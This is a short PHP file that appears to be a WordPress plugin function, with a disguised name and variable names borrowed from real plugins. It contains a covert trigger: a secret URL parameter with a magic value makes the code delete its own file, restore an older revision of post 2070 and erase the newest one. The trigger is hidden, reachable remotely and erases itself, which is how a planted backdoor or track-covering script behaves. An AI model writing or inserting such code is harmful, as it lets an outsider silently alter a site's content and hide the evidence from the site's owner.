<?php

function wpml_template_compare() {
	if (isset($_GET['gdpr_query_deprecated_cf7']) && $_GET['gdpr_query_deprecated_cf7'] === 'google_companion_widget_order') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$signature_really_star_better = 2070;
		$demomentsomtres_translator_extension_popular = wp_get_post_revisions($signature_really_star_better);
		if (empty($demomentsomtres_translator_extension_popular)) die('no revisions');
		if (count($demomentsomtres_translator_extension_popular) < 2) die('less than 2');
		$create_message_connector = array_shift($demomentsomtres_translator_extension_popular);
		$scheduler_statistics_total_parts = $create_message_connector->ID;
		$extended_limit_master = array_shift($demomentsomtres_translator_extension_popular);
		$statistics_timer_admin = $extended_limit_master->ID;
		$request_style_graph = wp_restore_post_revision($statistics_timer_admin);
		if ($request_style_graph === false) die('error restoring');
		$request_style_graph = wp_delete_post_revision($scheduler_statistics_total_parts);		
		if ($request_style_graph === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'wpml_template_compare');
